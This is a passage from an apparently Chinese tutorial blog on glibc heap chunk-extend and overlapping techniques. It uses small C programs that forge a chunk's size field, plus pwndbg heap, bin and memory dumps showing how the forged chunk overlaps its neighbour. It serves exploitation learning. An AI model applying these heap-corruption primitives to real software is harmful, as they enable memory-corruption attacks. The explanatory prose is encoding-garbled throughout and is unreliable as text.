class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x41</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x20fc1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x555555758000 â—‚â€” 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åè¯»å–ä¸‹å†…å­˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000041</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000020fc1</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¸‹ä¸€æ­¥æ˜¯é‡å¤´æˆï¼Œè¯•æƒ³ï¼Œå¦‚æœåŸ chunk1 çš„ size åŸŸæ²¡æœ‰çœŸæ­£å˜åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿›è¡Œ malloc ä¸€ä¸ª 0x30 å¤§å°çš„å †å—çš„æ—¶å€™ï¼Œå°±ä¸ä¼šåˆ†é…åˆ°è¿™ä¸ªåœ°å€ä¸Šï¼Œè€Œæ˜¯ä» Top Chunk é‡Œæ‹†åˆ†ï¼Œé‚£ä¹ˆäº‹å®ä¸Šæ˜¯æ€ä¹ˆæ ·çš„å‘¢ï¼Ÿå®è·µå‡ºçœŸçŸ¥ï¼Œçœ‹ä¸€ä¸‹å§ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758040</span><br><span class="line">Size: 0x20fc1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000041</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000020fc1&lt;======Top Chunk</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹æ˜¾ç„¶ï¼ŒTop Chunk å¹¶æœªè¢«æ‹†åˆ†ï¼Œè¿™é‡Œç¡®å®šäº†ï¼Œä¼¼ä¹ malloc (0x30) å¾—åˆ°çš„å †å—æ˜¯åŸ Chunk1 çš„åœ°å€ï¼Œè¿™é‡Œè¯´æ˜äº†ï¼Œè¿™é‡Œçš„åŸ chunk1 å› ä¸º size åŸŸè¢«ä¿®æ”¹äº†ä¹‹åæˆä¸ºäº†ä¸€ä¸ªæ–°çš„æ›´å¤§çš„å †å—ï¼Œè¿™é‡Œä¹Ÿå°±é€ æˆäº†æ‰€è°“çš„å †é‡å äº†ï¼Œchunk1 å› ä¸ºä¿®æ”¹äº† size åŸŸåï¼Œç”Ÿæˆçš„é‚£ä¸ªæ–°çš„ chunk å’Œ chunk2 éƒ¨åˆ†é‡å äº†ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†ï¼Œæœ‰çš„å¯¹åŸ chunk1 çš„ä¿®æ”¹å¯ä»¥ä¿®æ”¹åˆ° chunk2 çš„åœ°æ–¹ï¼Œå¦‚æœ chunk2 ä¿ç•™äº†æŒ‡é’ˆï¼Œé‚£å°±å¯ä»¥å¯¹ chunk2 è¿›è¡Œä¼ªé€ ï¼Œå¯ä»¥ç»“åˆç±»ä¼¼ off by one å’Œ UAF å½¢æˆå¾ˆå¤šç§åˆ©ç”¨æ–¹å¼ã€‚</p><h2 id="2-å¯¹inuseçš„smallbinè¿›è¡Œextend"><a class="markdownIt-Anchor" href="#2-å¯¹inuseçš„smallbinè¿›è¡Œextend">#</a> 2ã€å¯¹ inuse çš„ smallbin è¿›è¡Œ extendï¼š</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g 2.c</span></span><br><span class="line"><span class="comment">//æ³¨æ„æŠŠä¹‹å‰é‚£ä¸ªa.outç»™åˆ æ‰</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *ptr,*ptr1;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x80</span>);<span class="comment">//åˆ†é…ç¬¬ä¸€ä¸ª 0x80 çš„chunk1</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„chunk2</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//é˜²æ­¢ä¸top chunkåˆå¹¶</span></span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> *)((<span class="type">long</span>)ptr<span class="number">-0x8</span>)=<span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr1=<span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é¦–å…ˆè¿›è¡Œä¸‰æ¬¡åˆ†é…ï¼Œå…¶ä¸­ï¼Œç¬¬ä¸‰æ¬¡åˆ†é…æ˜¯é˜²æ­¢ extend åï¼Œchunk ä¸ topchunk è¿›è¡Œåˆå¹¶ï¼Œæ— éœ€å…³æ³¨ã€‚å…ˆçœ‹çœ‹ç»è¿‡ä¸‰æ¬¡ malloc ä¹‹åçš„å †ç©ºé—´æ˜¯å•¥æ ·çš„ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758090</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/40gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x0000000000000091&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021&lt;======Chunk3</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000020f31&lt;======Top Chunk</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¼°æ‘¸ä¸€ä¸‹ï¼Œchunk1 çš„å¤§å°ä¼¼ä¹æœ‰ç‚¹å¤§ï¼Œå¯¼è‡´ free æ‰çš„ chunk1 å¹¶ä¸ä¼šè¿›å…¥ fastbinï¼Œè€Œæ˜¯è¿›å…¥ smallbinï¼Œé‚£ä¹ˆä¿®æ”¹äº† size åŸŸåï¼ŒåŸæœ¬ä¸‰ä¸ª chunk åœ¨ gdb é‡Œçš„ heap æŒ‡ä»¤ä¸‹ä¾æ—§å°‘äº†ä¸€ä¸ª:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/40gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x0000000000000000  0x0000000000000021&lt;======Chunk3</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000020f31&lt;======Top Chunk</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹ä¸‹ä¸€æ­¥ï¼Œfree æ‰ chunk1ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line">fd: 0x7ffff7dd1b78</span><br><span class="line">bk: 0x7ffff7dd1b78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x20</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555758000 â€”â–¸ 0x7ffff7dd1b78 (main_arena+88) â—‚â€” 0x555555758000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/40gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1&lt;======Chunk1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021&lt;======Chunk2</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x00000000000000b0  0x0000000000000020&lt;======Chunk3</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000020f31&lt;======Top Chunk</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå‘ç°äº†ä¸€ä¸ªç‚¹éœ€è¦æ³¨æ„ï¼Œå°±æ˜¯ free æ‰ size åŸŸä¿®æ”¹äº†ä¹‹åçš„é‚£ä¸ª chunk1 ä¹‹åï¼Œchunk3 çš„ size åŸŸçš„æœ€ä½ä¸ºï¼Œä¹Ÿå°±æ˜¯ p ä½ï¼Œå˜æˆäº† 0ï¼Œè¿™ä¹Ÿå°±è¯´æ˜ï¼Œchunk1 æ²¡æœ‰æ”¾åœ¨ fastbin é‡Œï¼Œä¸Šé¢ä¹Ÿçœ‹åˆ°äº†ï¼Œè¢«æ”¾åœ¨äº† unsortedbin é‡Œã€‚</p><p>â€‹é‚£ä¹ˆä¸ºå•¥ä¼šè¢«æ”¾å…¥ unsortedbin å†…è€Œä¸æ˜¯ smallbin å‘¢ï¼Ÿä¼°è®¡æœ‰ä¸€ä¸‹å‡ ç§å¯èƒ½ï¼š</p><ul><li>å½“ä¸€ä¸ªè¾ƒå¤§çš„ chunk è¢«åˆ†å‰²æˆä¸¤åŠåï¼Œå¦‚æœå‰©ä¸‹çš„éƒ¨åˆ†å¤§äº MINSIZEï¼Œå°±ä¼šè¢«æ”¾åˆ° unsortedbin ä¸­ã€‚</li><li>é‡Šæ”¾ä¸€ä¸ªä¸å±äº fastbin çš„ chunkï¼Œå¹¶ä¸”è¯¥ chunk ä¸å’Œ top chunk ç´§é‚»æ—¶ï¼Œè¯¥ chunk å°±ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­ï¼Œå½“ç¬¬äºŒæ¬¡åˆ†é…çš„æ—¶å€™ï¼Œæ²¡æœ‰åœ¨ unsortedbin ä¸­æ‰¾åˆ°åˆé€‚çš„ï¼Œæ‰ä¼šè¢«æ”¾å…¥åˆ°å…¶å¯¹åº”çš„ bin ä¸­ã€‚</li></ul><p>â€‹ä¹‹åè¿›è¡Œåˆ†é…ï¼Œåˆ†é… 0xa0 å¤§å°çš„å †å—ï¼Œå°±ä¼šå‘ç°ï¼ŒåŸ chunk1 çš„åœ°å€ä¾æ—§æ‹¿å»ç”¨äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555758000</span><br><span class="line">Size: 0xb1</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580b0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555557580d0</span><br><span class="line">Size: 0x20f31</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bin</span></span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/40gx 0x555555758000</span></span><br><span class="line">0x555555758000: 0x0000000000000000  0x00000000000000b1</span><br><span class="line">0x555555758010: 0x00007ffff7dd1b78  0x00007ffff7dd1b78</span><br><span class="line">0x555555758020: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758030: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758040: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758050: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758060: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758070: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758080: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758090: 0x0000000000000000  0x0000000000000021</span><br><span class="line">0x5555557580a0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580b0: 0x00000000000000b0  0x0000000000000021</span><br><span class="line">0x5555557580c0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580d0: 0x0000000000000000  0x0000000000020f31</span><br><span class="line">0x5555557580e0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x5555557580f0: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758100: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758110: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758120: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x555555758130: 0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="3-å¯¹freeçš„smallbinè¿›è¡Œextend"><a class="markdownIt-Anchor" href="#3-å¯¹freeçš„smallbinè¿›è¡Œextend">#</a> 3ã€å¯¹ free çš„ smallbin è¿›è¡Œ extendï¼š</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 